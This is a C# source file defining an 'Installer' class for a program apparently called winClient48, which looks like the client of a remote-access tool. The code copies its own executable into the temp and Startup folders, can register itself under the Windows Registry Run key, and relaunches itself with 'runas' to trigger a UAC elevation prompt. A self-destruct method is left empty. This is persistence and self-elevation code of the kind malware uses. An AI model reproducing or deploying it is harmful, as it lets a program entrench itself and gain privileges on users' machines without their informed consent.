using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace winClient48
{
    internal class Installer
    {
        public bool copy_temp;
        public bool copy_startup;
        public bool registry_run;

        private string this_path;
        private string path_temp;
        private string path_startup;

        private RegistryKey reg_key;

        public Installer()
        {
            this_path = Process.GetCurrentProcess().MainModule.FileName;
            path_temp = Path.Combine(Path.GetTempPath(), Path.GetFileName(this_path));
            path_startup = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(this_path));

            reg_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }

        /// <summary>
        /// Start installer.
        /// </summary>
        public void Start()
        {
            bool restart = false;
            Copy();

            if (restart)
            {
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Copy to specified directory.
        /// </summary>
        private void Copy()
        {
            if (copy_temp)
            {
                if (!File.Exists(path_temp))
                {
                    File.Copy(this_path, path_temp, true);
                }
            }
            if (copy_startup)
            {
                if (!File.Exists(path_startup))
                {
                    File.Copy(this_path, path_startup, true);
                }
            }
        }

        /// <summary>
        /// Registry install.
        /// </summary>
        private void RegRun()
        {
            reg_key.SetValue("ThisApp", this_path);
        }

        /// <summary>
        /// UAC priviledge escalation.
        /// </summary>
        public void UAC()
        {
            if (!Form1.isAdmin())
            {
                ProcessStartInfo info = new ProcessStartInfo()
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", //TRIGGER THE UAC PROMPT
                };
                Process.Start(info);
            }
        }

        public void SelfDestroy()
        {

        }
    }
}
